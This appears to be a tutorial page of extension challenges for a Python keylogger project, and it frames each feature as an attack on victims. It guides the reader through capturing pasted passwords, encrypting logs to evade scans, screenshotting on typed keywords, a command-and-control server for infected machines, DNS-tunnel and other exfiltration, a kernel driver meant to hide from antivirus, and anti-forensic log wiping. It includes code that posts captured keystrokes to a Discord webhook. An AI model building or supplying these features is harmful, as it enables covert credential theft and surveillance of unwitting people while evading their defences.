# Challenges & Extensions — Keylogger

You've built the base project. Now make it yours by extending it with new features.

These challenges are ordered by difficulty. Start with the easier ones to build confidence, then tackle the harder ones when you want to dive deeper.

---

## Easy Challenges

### Challenge 1: Add Clipboard Monitoring
**What to build:**
Capture clipboard contents whenever the user copies or pastes text. Log clipboard data alongside keystrokes to catch passwords users paste from password managers.

**Why it's useful:**
Many users never type their passwords, they paste them. Keyloggers miss these credentials entirely. Clipboard monitoring catches data that keyboard capture alone can't see.

**Implementation hints:**
- Install pyperclip: `pip install pyperclip`
- Create a `ClipboardMonitor` class similar to `WindowTracker`
- Poll clipboard every 0.5 seconds in a separate thread
- Compare current clipboard to previous, log if different

**Test it works:**
Copy some text (Ctrl+C), check the log file for `[CLIPBOARD] text you copied`.

---

### Challenge 2: Filter Sensitive Applications
**What to build:**
Add configuration to skip logging keystrokes from specific applications like password managers (1Password, LastPass, KeePass).

**Implementation hints:**
- Add `excluded_apps` list to `KeyloggerConfig`
- In `_on_press`, check if `self._current_window` contains any excluded app name
- Use case-insensitive matching: `window_title.lower()` contains `"1password"`

**Test it works:**
Add "notepad" to excluded apps. Open Notepad, type some text. Check logs, verify Notepad keystrokes aren't recorded.

---

### Challenge 3: Add Keystroke Statistics
**What to build:**
Track and display statistics: total keystrokes captured, keystrokes per application, most common keys pressed, logging uptime.

**Implementation hints:**
- Add a `Statistics` class with counters: `total_keys`, `keys_per_app`, `special_key_count`
- Increment counters in `_on_press` before writing to LogManager
- Use `collections.Counter` for `keys_per_app` tracking
- Print stats in `stop()` method

**Expected output:**
```
Statistics:
Total keystrokes: 247
Uptime: 0:05:32
Top applications:
  chrome.exe - Gmail: 156 keystrokes
  code.exe - keylogger.py: 91 keystrokes
```

---

## Intermediate Challenges

### Challenge 4: Encrypt Log Files
**What to build:**
Encrypt log files using AES-256 so disk scans don't find sensitive keywords like "password" or "creditcard".

**Implementation approach:**
1. Install cryptography: `pip install cryptography`
2. Import `from cryptography.fernet import Fernet`
3. Generate key in `__init__`: `self.key = Fernet.generate_key()`
4. Encrypt data before writing: `encrypted = fernet.encrypt(log_string.encode())`
5. Add `decrypt_log(log_path, key)` utility function

**Extra credit:**
Use asymmetric encryption (RSA). Generate key pair, encrypt logs with public key, only attacker with private key can decrypt.

---

### Challenge 5: Screenshot Capture on Keywords
**What to build:**
Automatically capture screenshots when sensitive keywords are typed (password, credit, ssn, secret).

**Implementation approach:**
1. Install Pillow: `pip install pillow`  
2. Install pyscreenshot: `pip install pyscreenshot`
3. Create `ScreenshotCapture` class
4. Maintain sliding window of last 20 characters
5. Check if window contains trigger keywords

**Hints:**
```python
def _check_keywords(self, key_str: str) -> None:
    self._recent_keys.append(key_str)
    if len(self._recent_keys) > 20:
        self._recent_keys.pop(0)

    recent_text = ''.join(self._recent_keys).lower()
    for keyword in self.config.trigger_keywords:
        if keyword in recent_text:
            self.screenshot_capture.capture(keyword)
```

**Gotchas:**
- Screenshots are large (1-5MB each), will fill disk quickly
- Throttle screenshots: Don't capture more than 1 per 5 seconds

---

## Advanced Challenges

### Challenge 6: Command and Control Server
**What to build:**
Create a Flask server that receives webhook data from multiple infected machines, stores it in a database, and provides a web UI for browsing captured keystrokes.

**High level architecture:**
```
┌─────────────────┐
│   Victim        │
│   (Keylogger)   │
└────────┬────────┘
         │ HTTPS POST
         ▼
┌─────────────────┐      ┌──────────────┐
│  C2 Server      │◄────►│  PostgreSQL  │
│  (Flask API)    │      │  (Storage)   │
└────────┬────────┘      └──────────────┘
         │
         ▼
┌─────────────────┐
│   Web Dashboard │
└─────────────────┘
```

**Implementation phases:**
1. Flask app with `/webhook` endpoint
2. PostgreSQL schema for victims and keystrokes
3. Query endpoints for analysis
4. Web dashboard with search and filtering

---

### Challenge 7: Multi-Protocol Exfiltration
**What to build:**
Support multiple exfiltration channels (HTTP, DNS tunneling, email, cloud storage) with automatic failover.

**Architecture:**
```
┌─────────────────────────────────────┐
│      Exfiltration Manager           │
│   (Priority-based channel selection) │
└───┬───────┬────────┬─────────┬──────┘
    │       │        │         │
    ▼       ▼        ▼         ▼
┌────────┐ ┌─────┐ ┌──────┐ ┌──────┐
│Webhook │ │ DNS │ │Email │ │Cloud │
│Channel │ │Tunnel│ │SMTP │ │ API  │
└────────┘ └─────┘ └──────┘ └──────┘
```

**Success criteria:**
- [ ] Support 4+ exfiltration channels
- [ ] Automatic failover in <30 seconds
- [ ] Logs don't pile up if channels temporarily down

---

## Expert Challenges

### Challenge 8: Kernel-Level Keystroke Capture (Windows)
**What to build:**
Write a kernel driver that intercepts keyboard events at the kernel level, below where EDR and antivirus can see.

**Important:** This requires Windows Driver Kit (WDK), C/C++ programming, and kernel debugging skills. Kernel bugs cause Blue Screen of Death (BSOD). Only attempt this on a virtual machine.

**Architecture:**
```
┌──────────────────────────────────────┐
│         User Mode                    │
│  ┌──────────────────────────────┐   │
│  │  Keylogger Service           │   │
│  │  (Receives from driver)      │   │
│  └──────────────────────────────┘   │
└──────────────┬───────────────────────┘
               │ IOCTL
┌──────────────┴───────────────────────┐
│         Kernel Mode                  │
│  ┌──────────────────────────────┐   │
│  │  Keyboard Filter Driver      │   │
│  └──────────────────────────────┘   │
└──────────────────────────────────────┘
```

---

## Quick Extension Ideas

### Integrate with Discord Webhook
Send keystroke logs to a Discord channel via webhook. Provides free, real-time notifications with no server setup required.

**Discord expects:**
```python
payload = {"content": f"```{log_content}```"}
requests.post(discord_webhook_url, json=payload)
```

**Watch out for:**
- Discord webhooks have 2000 character limit per message
- Discord rate limits to 5 requests/second

---

### Add Anti-Forensics (Panic Delete)
Delete log files on specific trigger (panic key, USB removal, process termination).

```python
def _secure_delete_logs(self):
    for log_file in self.config.log_dir.glob("keylog_*.txt"):
        # Overwrite with random data 7 times (DoD 5220.22-M standard)
        for _ in range(7):
            with open(log_file, 'wb') as f:
                f.write(os.urandom(log_file.stat().st_size))
        log_file.unlink()
```

---

### High-Speed Optimization
Optimize to handle extreme typing speeds without dropping keystrokes.

**Approach: Lock-Free Queue**
```python
from queue import Queue

# Producer (callback) - never blocks
def _on_press(self, key):
    self._event_queue.put(key)

# Consumer (writer thread) - drains queue
def _writer_thread(self):
    while self._running:
        event = self._event_queue.get()
        self.log_manager.write_event(event)
```

---

## Challenge Completion Tracker

- [ ] Easy: Clipboard Monitoring
- [ ] Easy: Filter Sensitive Applications
- [ ] Easy: Keystroke Statistics
- [ ] Intermediate: Encrypt Log Files
- [ ] Intermediate: Screenshot Capture on Keywords
- [ ] Advanced: Command and Control Server
- [ ] Advanced: Multi-Protocol Exfiltration
- [ ] Expert: Kernel-Level Keystroke Capture

Completed all of them? You've mastered this project. Time to build something new or contribute your extensions!

---

## Getting Help

Stuck on a challenge?

1. **Debug systematically** - What did you expect to happen? What actually happened? What's the smallest test case that reproduces it?
2. **Read the existing code** - How does LogManager handle similar functionality? Could WebhookDelivery's pattern apply to your challenge?
3. **Check tests** - `test_keylogger.py` has many examples of component usage
